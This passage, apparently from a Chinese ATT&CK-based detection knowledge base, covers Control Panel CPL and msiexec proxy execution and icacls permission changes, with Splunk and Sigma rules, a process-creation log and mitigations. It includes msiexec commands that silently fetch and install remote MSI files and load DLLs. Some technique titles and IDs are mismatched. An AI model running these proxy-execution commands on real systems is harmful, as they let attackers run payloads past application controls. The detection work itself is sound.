<p>\u63a7\u5236\u9762\u677f\u9879\u76ee\u662f\u6ce8\u518c\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff08.exe\uff09\u6216\u63a7\u5236\u9762\u677f\uff08.cpl\uff09\u6587\u4ef6\uff0c\u540e\u8005\u5b9e\u9645\u4e0a\u662f\u91cd\u547d\u540d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff08.dll\uff09\u6587\u4ef6\uff0c\u5b83\u4eec\u5bfc\u51faCPlApplet\u51fd\u6570\u3002\u4e3a\u4e86\u6613\u4e8e\u4f7f\u7528\uff0c\u201c\u63a7\u5236\u9762\u677f\u201d\u9879\u901a\u5e38\u5305\u62ec\u5728\u6ce8\u518c\u5e76\u52a0\u8f7d\u5230\u201c\u63a7\u5236\u9762\u677f\u201d\u4e2d\u540e\u53ef\u4f9b\u7528\u6237\u4f7f\u7528\u7684\u56fe\u5f62\u83dc\u5355\u3002\u53ef\u4ee5\u4ece\u547d\u4ee4\u884c\u76f4\u63a5\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\uff0c\u53ef\u4ee5\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u7f16\u7a0b\u63a5\u53e3\uff08API\uff09\u8c03\u7528\u4ee5\u7f16\u7a0b\u65b9\u5f0f\u6267\u884c\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u53cc\u51fb\u6587\u4ef6\u6765\u6267\u884c\u3002</p> <p>\u6076\u610f\u63a7\u5236\u9762\u677f\u9879\u76ee\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u9493\u9c7c\u6d3b\u52a8\u4f20\u9012\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u591a\u9636\u6bb5\u6076\u610f\u8f6f\u4ef6\u7684\u4e00\u90e8\u5206\u6267\u884c\u3002\u63a7\u5236\u9762\u677f\u9879\u76ee\uff0c\u5c24\u5176\u662fCPL\u6587\u4ef6\uff0c\u4e5f\u53ef\u80fd\u4f1a\u7ed5\u8fc7\u5e94\u7528\u7a0b\u5e8f\u6216\u6587\u4ef6\u6269\u5c55\u540d\u5141\u8bb8\u5217\u8868\u3002</p> <p>\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4f7f\u7528\u63a7\u5236\u9762\u677f\u6587\u4ef6\u6269\u5c55\u540d\uff08.cpl\uff09\u91cd\u547d\u540d\u6076\u610fDLL\u6587\u4ef6\uff08.dll\uff09\uff0c\u5e76\u5c06\u5176\u6ce8\u518c\u5230HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls\u3002\u5373\u4f7f\u8fd9\u4e9b\u6ce8\u518c\u7684DLL\u4e0d\u7b26\u5408CPL\u6587\u4ef6\u89c4\u8303\u5e76\u4e14\u4e0d\u5bfc\u51faCPlApplet\u51fd\u6570\uff0c\u5728\u6267\u884c\u201c\u63a7\u5236\u9762\u677f\u201d\u65f6\u4e5f\u4f1a\u901a\u8fc7\u5176DllEntryPoint\u52a0\u8f7d\u5e76\u6267\u884c\u5b83\u4eec\u3002\u4e0d\u5bfc\u51faCPlApplet\u7684CPL\u6587\u4ef6\u4e0d\u80fd\u76f4\u63a5\u6267\u884c\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Control.exe\u662f\u5fae\u8f6fWindows\u64cd\u4f5c\u7cfb\u7edf\u81ea\u5e26\u7684\u7a0b\u5e8f\u3002\u7528\u4e8e\u8bbf\u95ee\u63a7\u5236\u9762\u677f\u3002\u8fd9\u4e0d\u662f\u7eaf\u7cb9\u7684\u7cfb\u7edf\u7a0b\u5e8f\uff0c\u4f46\u662f\u5982\u679c\u7ec8\u6b62\u5b83\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u4e0d\u53ef\u77e5\u7684\u95ee\u9898\u3002</p> <p>\u6682\u65e0\u6d4b\u8bd5\u6848\u4f8b</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows security</p> <p>windows sysmon</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u76d1\u89c6\u548c\u5206\u6790\u4e0eCPL\u6587\u4ef6\u76f8\u5173\u7684\u9879\u76ee\u76f8\u5173\u7684\u6d3b\u52a8\uff0c\u4f8b\u5982Windows Control Panel\u8fdb\u7a0b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff08control.exe\uff09\u4ee5\u53cashell32.dll\u4e2d\u7684Control_RunDLL\u548cControlRunDLLAsUser API\u51fd\u6570\u3002\u4ece\u547d\u4ee4\u884c\u6267\u884c\u6216\u5355\u51fb\u65f6\uff0c\u5728\u4f7f\u7528Rundll32\u8c03\u7528CPL\u7684API\u51fd\u6570\uff08\u4f8b\u5982\uff1arundll32.exe shell32.dll\uff0cControl_RunDLL\u6587\u4ef6\uff09\u4e4b\u524d\uff0ccontrol.exe\u5c06\u6267\u884cCPL\u6587\u4ef6\uff08\u4f8b\u5982\uff1acontrol.exe file.cpl\uff09.cpl\uff09\u3002\u4ec5\u4f7f\u7528\u540e\u4e00\u4e2aRundll32\u547d\u4ee4\u5c31\u53ef\u4ee5\u901a\u8fc7CPL API\u51fd\u6570\u76f4\u63a5\u6267\u884cCPL\u6587\u4ef6\uff0c\u8be5\u547d\u4ee4\u53ef\u80fd\u4f1a\u7ed5\u8fc7control.exe\u7684\u68c0\u6d4b\u548c/\u6216\u6267\u884c\u8fc7\u6ee4\u5668\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#splunk","title":"splunk\u89c4\u5219","text":"<pre><code>index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d\\\\control.exe\u201d CommandLine=\u201d.cpl*\u201d) OR (EventCode=1 Image=\u201d\\\\rundll32.exe\u201d CommandLine =\u201dshell32.dll,Control_RunDLL\u201d CommandLine=\u201d.cpl\u201d) OR (EventCode=1 Image=\u201d\\\\rundll32.exe\u201d CommandLine =\u201dshell32.dll,ControlRunDLLAsUse\u201d CommandLine=\u201d.cpl\u201d) OR (EventCode=1 Image=\u201d\\\\rundll32.exe\u201d CommandLine =\u201d.cpl*\u201d) OR (EventCode IN (12,13) TargetObject IN (\u201cHKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\ControlPanel\\\\NameSpace*\u201d , \u201cHKCR\\\\CLSID*\u201d , \u201cHKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\ControlPanel*\u201d , \u201c*Shellex\\\\PropertySheetHandlers\u201d))\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1070-004</p> <p>https://attack.mitre.org/techniques/T1218/002/</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/","title":"T1218-002-win-\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u4ee3\u7406\u6267\u884c\uff1a\u63a7\u5236\u9762\u677f","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528msiexec.exe\u6765\u4ee3\u7406\u6076\u610f\u6709\u6548\u8d1f\u8f7d\u7684\u6267\u884c\u3002Msiexec.exe\u662fWindows\u5b89\u88c5\u7a0b\u5e8f\u7684\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff0c\u56e0\u6b64\u901a\u5e38\u4e0e\u6267\u884c\u5b89\u88c5\u5305\uff08.msi\uff09\u76f8\u5173\u8054\u3002Msiexec.exe\u7531Microsoft\u8fdb\u884c\u6570\u5b57\u7b7e\u540d\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528msiexec.exe\u6765\u542f\u52a8\u672c\u5730\u6216\u7f51\u7edc\u53ef\u8bbf\u95ee\u7684MSI\u6587\u4ef6\u3002Msiexec.exe\u8fd8\u53ef\u4ee5\u6267\u884cDLL\u3002\u7531\u4e8eMsiexec.exe\u5728Windows\u7cfb\u7edf\u4e0a\u662f\u7b7e\u540d\u7684\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528Msiexec.exe\u7ed5\u8fc7\u4e0d\u8003\u8651\u5176\u6f5c\u5728\u6ee5\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u63a7\u5236\u89e3\u51b3\u65b9\u6848\u3002\u5982\u679c\u542f\u7528\u4e86AlwaysInstallElevated\u7b56\u7565\uff0cMsiexec.exe\u7684\u6267\u884c\u4e5f\u53ef\u4ee5\u63d0\u5347\u4e3a\u7cfb\u7edf\u6743\u9650\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6765\u81ea\u5fae\u8f6f\u7684msiexec\u4ecb\u7ecd\uff1ahttps://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/msiexec</p> <pre><code>msiexec.exe /q /i \"C:\\path\\xx.msi\"\nmsiexec.exe /q /I http://8.8.4.4/xx.msi\nmsiexec.exe /y \"C:\\path\\xx.dll\"\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows security</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u4ec5\u505a\u6f14\u793a\uff1a</p> <pre><code>C:\\Users\\Administrator&gt;msiexec.exe /q /I http://www.baidu.com/1.msi\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd7 4688</p> <pre><code>\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\n\n\u521b\u5efa\u8005\u4e3b\u9898:\n \u5b89\u5168 ID:  QAX\\Administrator\n \u5e10\u6237\u540d:  Administrator\n \u5e10\u6237\u57df:  QAX\n \u767b\u5f55 ID:  0x9D23C\n\n\u76ee\u6807\u4e3b\u9898:\n \u5b89\u5168 ID:  NULL SID\n \u5e10\u6237\u540d:  -\n \u5e10\u6237\u57df:  -\n \u767b\u5f55 ID:  0x0\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u65b0\u8fdb\u7a0b ID:  0x19c\n \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\msiexec.exe\n \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1936\n \u5f3a\u5236\u6027\u6807\u7b7e:  Mandatory Label\\High Mandatory Level\n \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x690\n \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe\n \u8fdb\u7a0b\u547d\u4ee4\u884c: msiexec.exe  /q /I http://www.baidu.com/1.msi\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: \u4f7f\u7528msiexec.exe\u6267\u884c\u6076\u610f\u7a0b\u5e8f\ndescription: \u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528msiexec.exe\u6765\u542f\u52a8\u672c\u5730\u6216\u7f51\u7edc\u53ef\u8bbf\u95ee\u7684MSI\u6587\u4ef6\u3002\nstatus: experimental\nreferences:\n    - https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/msiexec \nlogsource:\n\u200b    product: windows\n\u200b    service: security\ndetection:\n\u200b    selection:\n\u200b        EventID:\n\u200b                - 4688 #Windows \u5b89\u5168\u65e5\u5fd7\n        New Process Name: 'msiexec .exe' #Application Name\n        Commanline: \n                - '/q'\n                - '/y'\n                - '/i'\n\u200b    condition: selection\nlevel: low\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_6","title":"\u5efa\u8bae","text":"<p>\u4f7f\u7528\u8fdb\u7a0b\u76d1\u63a7\u6765\u76d1\u89c6msiexec.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u5c06msiexec.exe\u7684\u6700\u8fd1\u8c03\u7528\u4e0e\u5df2\u77e5\u826f\u597d\u81ea\u53d8\u91cf\u548c\u6267\u884c\u7684MSI\u6587\u4ef6\u6216DLL\u7684\u5148\u524d\u5386\u53f2\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ee5\u786e\u5b9a\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u5bf9\u6297\u6d3b\u52a8\u3002\u5728\u8c03\u7528msiexec.exe\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u5728\u786e\u5b9a\u6b63\u5728\u6267\u884c\u7684MSI\u6587\u4ef6\u6216DLL\u7684\u6765\u6e90\u548c\u7528\u9014\u65b9\u9762\u4e5f\u53ef\u80fd\u5f88\u6709\u7528\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<ol> <li>\u7981\u7528\u6216\u5220\u9664\u529f\u80fd\u6216\u7a0b\u5e8f\uff1a\u5c06Msiexec.exe\u7684\u6267\u884c\u9650\u5236\u4e3a\u9700\u8981\u4f7f\u7528\u5b83\u7684\u7279\u6743\u5e10\u6237\u6216\u7ec4\uff0c\u4ee5\u51cf\u5c11\u6076\u610f\u4f7f\u7528\u7684\u673a\u4f1a\u3002</li> <li>\u7279\u6743\u8d26\u6237\u7ba1\u7406\uff1a\u5c06Msiexec.exe\u7684\u6267\u884c\u9650\u5236\u4e3a\u9700\u8981\u4f7f\u7528\u5b83\u7684\u7279\u6743\u5e10\u6237\u6216\u7ec4\uff0c\u4ee5\u51cf\u5c11\u6076\u610f\u4f7f\u7528\u7684\u673a\u4f1a\u3002</li> </ol>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1070-007</p> <p>https://attack.mitre.org/techniques/T1218/007/</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/","title":"T1222-001-win-\u6587\u4ef6\u6743\u9650\u4fee\u6539","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u6587\u4ef6\u548c\u76ee\u5f55\u6743\u9650\u901a\u5e38\u7531\u6587\u4ef6\u6216\u76ee\u5f55\u6240\u6709\u8005\u6307\u5b9a\u7684\u4efb\u610f\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff08DACL\uff09\u7ba1\u7406\u3002\u6587\u4ef6\u548c\u76ee\u5f55DACL\u7684\u5b9e\u73b0\u56e0\u5e73\u53f0\u800c\u5f02\uff0c\u4f46\u901a\u5e38\u4f1a\u660e\u786e\u6307\u5b9a\u5b83\u4eec\uff0c\u4ee5\u4fbf\u7528\u6237/\u7ec4\u53ef\u4ee5\u6267\u884c\u64cd\u4f5c\uff0c\u4f8b\u5982\u8bfb\u53d6\uff0c\u5199\u5165\uff0c\u6267\u884c\u7b49\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6743\u9650\u6216\u5c5e\u6027\uff0c\u4ee5\u9003\u907f\u9884\u671f\u7684DACL\u3002\u4fee\u6539\u53ef\u80fd\u5305\u62ec\u66f4\u6539\u7279\u5b9a\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u8fd9\u53ef\u80fd\u9700\u8981\u83b7\u53d6\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6240\u6709\u6743\u6216\u63d0\u5347\u7684\u6743\u9650\uff08\u4f8b\u5982Administrator/root\uff09\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u73b0\u6709\u6743\u9650\u4ee5\u542f\u7528\u6076\u610f\u6d3b\u52a8\uff0c\u4f8b\u5982\u4fee\u6539\uff0c\u66ff\u6362\u6216\u5220\u9664\u7279\u5b9a\u6587\u4ef6\u76ee\u5f55\u3002\u7279\u5b9a\u6587\u4ef6\u548c\u76ee\u5f55\u4fee\u6539\u53ef\u80fd\u662f\u8bb8\u591a\u6280\u672f\u6240\u5fc5\u9700\u7684\u6b65\u9aa4\uff0c\u4f8b\u5982\uff0c\u901a\u8fc7\u53ef\u8bbf\u95ee\u6027\u529f\u80fd\uff0c\u767b\u5f55\u811a\u672c\u5efa\u7acb\u6301\u4e45\u6027\uff0c\u6216\u6c61\u67d3\u3001\u52ab\u6301\u5176\u4ed6\u5de5\u5177\u4e8c\u8fdb\u5236\u914d\u7f6e\u6587\u4ef6\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Icacls \u662f\u4e00\u79cd\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5b83\u663e\u793a\u6216\u4fee\u6539\u6307\u5b9a\u6587\u4ef6\u4e0a\u7684\u968f\u673a\u8bbf\u95ee\u63a7\u5236\u5217\u8868 (DACL)\uff0c\u5e76\u5c06\u5b58\u50a8\u7684 DACL \u5e94\u7528\u4e8e\u6307\u5b9a\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u3002Icacls.exe\u66ff\u6362\u4e86Cacls.exe \u5de5\u5177\u7528\u4e8e\u67e5\u770b\u548c\u7f16\u8f91DACL\u3002ICACLS\u662fWindows Server 2003 SP2\u4e2dCACLS\u5de5\u5177\u7684\u5347\u7ea7\u7248\u672c\uff0c\u53ef\u7528\u4e8e\u4ece\u6062\u590d\u63a7\u5236\u53f0\u91cd\u8bbe\u6587\u4ef6\u4e2d\u7684\u5e10\u6237\u63a7\u5236\u5217\u8868 (ACL) \u4ee5\u53ca\u5907\u4efdACL\u3002\u4e0eCACLS\u4e0d\u540c\u7684\u662f\uff0cICACLS\u53ef\u4ee5\u6b63\u786e\u5730\u4f20\u9001\u5bf9\u7ee7\u627f\u7684ACL\u7684\u66f4\u6539\u548c\u521b\u5efa\u3002\u6709ICACLS\u7684\u4f7f\u7528\u53ca\u547d\u4ee4\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7\u5728\u547d\u4ee4\u63d0\u793a\u7b26\u4e0b\u8fd0\u884c\u201cicacls /?\u201d\u8fdb\u884c\u8bbf\u95ee\u3002\u8fd9\u91cc\u7684I\u5e94\u8be5\u662fImproved upgrade of cacls.</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows security</p> <p>windows sysmon</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4f60\u9700\u8981\u5728cmd\u6216powershell\u4e2d\u8c03\u7528\u5b83\u3002</p> <pre><code>Microsoft Windows [\u7248\u672c 6.1.7601]\n\u7248\u6743\u6240\u6709 (c) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\nC:\\Users\\Administrator&gt;icacls\nICACLS name /save aclfile [/T] [/C] [/L] [/Q]\n\u5c06\u5339\u914d\u540d\u79f0\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7684 DACL \u5b58\u50a8\u5230 aclfile \u4e2d\u4ee5\u4fbf\u5c06\u6765\u4e0e\n/restore \u4e00\u8d77\u4f7f\u7528\u3002\u8bf7\u6ce8\u610f\uff0c\u672a\u4fdd\u5b58 SACL\u3001\u6240\u6709\u8005\u6216\u5b8c\u6574\u6027\u6807\u7b7e\u3002\nICACLS directory [/substitute SidOld SidNew [...]] /restore aclfile\n[/C] [/L] [/Q]\n\u5c06\u5b58\u50a8\u7684 DACL \u5e94\u7528\u4e8e\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u3002\nICACLS name /setowner user [/T] [/C] [/L] [/Q]\n\u66f4\u6539\u6240\u6709\u5339\u914d\u540d\u79f0\u7684\u6240\u6709\u8005\u3002\u8be5\u9009\u9879\u4e0d\u4f1a\u5f3a\u5236\u66f4\u6539\u6240\u6709\u8eab\u4efd\uff1b\n\u4f7f\u7528 takeown.exe \u5b9e\u7528\u7a0b\u5e8f\u53ef\u5b9e\u73b0\u8be5\u76ee\u7684\u3002\nICACLS name /findsid Sid [/T] [/C] [/L] [/Q]\n\u67e5\u627e\u5305\u542b\u663e\u5f0f\u63d0\u53ca SID \u7684 ACL \u7684\u6240\u6709\u5339\u914d\u540d\u79f0\u3002\nICACLS name /verify [/T] [/C] [/L] [/Q]\n\u67e5\u627e\u5176 ACL \u4e0d\u89c4\u8303\u6216\u957f\u5ea6\u4e0e ACE \u8ba1\u6570\u4e0d\u4e00\u81f4\u7684\u6240\u6709\u6587\u4ef6\u3002\nICACLS name /reset [/T] [/C] [/L] [/Q]\n\u4e3a\u6240\u6709\u5339\u914d\u6587\u4ef6\u4f7f\u7528\u9ed8\u8ba4\u7ee7\u627f\u7684 ACL \u66ff\u6362 ACL\u3002\nICACLS name [/grant[:r] Sid:perm[...]]\n[/deny Sid:perm [...]]\n[/remove[:g|:d]] Sid[...]] [/T] [/C] [/L]\n[/setintegritylevel Level:policy[...]]\n/grant[:r] Sid:perm \u6388\u4e88\u6307\u5b9a\u7684\u7528\u6237\u8bbf\u95ee\u6743\u9650\u3002\u5982\u679c\u4f7f\u7528 :r\uff0c\n\u8fd9\u4e9b\u6743\u9650\u5c06\u66ff\u6362\u4ee5\u524d\u6388\u4e88\u7684\u6240\u6709\u663e\u5f0f\u6743\u9650\u3002\n\u5982\u679c\u4e0d\u4f7f\u7528 :r\uff0c\u8fd9\u4e9b\u6743\u9650\u5c06\u6dfb\u52a0\u5230\u4ee5\u524d\u6388\u4e88\u7684\u6240\u6709\u663e\u5f0f\u6743\u9650\u3002\n/deny Sid:perm \u663e\u5f0f\u62d2\u7edd\u6307\u5b9a\u7684\u7528\u6237\u8bbf\u95ee\u6743\u9650\u3002\n\u5c06\u4e3a\u5217\u51fa\u7684\u6743\u9650\u6dfb\u52a0\u663e\u5f0f\u62d2\u7edd ACE\uff0c\n\u5e76\u5220\u9664\u6240\u6709\u663e\u5f0f\u6388\u4e88\u7684\u6743\u9650\u4e2d\u7684\u76f8\u540c\u6743\u9650\u3002\n/remove[:[g|d]] Sid \u5220\u9664 ACL \u4e2d\u6240\u6709\u51fa\u73b0\u7684 SID\u3002\u4f7f\u7528\n:g\uff0c\u5c06\u5220\u9664\u6388\u4e88\u8be5 SID \u7684\u6240\u6709\u6743\u9650\u3002\u4f7f\u7528\n:d\uff0c\u5c06\u5220\u9664\u62d2\u7edd\u8be5 SID \u7684\u6240\u6709\u6743\u9650\u3002\n/setintegritylevel [(CI)(OI)] \u7ea7\u522b\u5c06\u5b8c\u6574\u6027 ACE 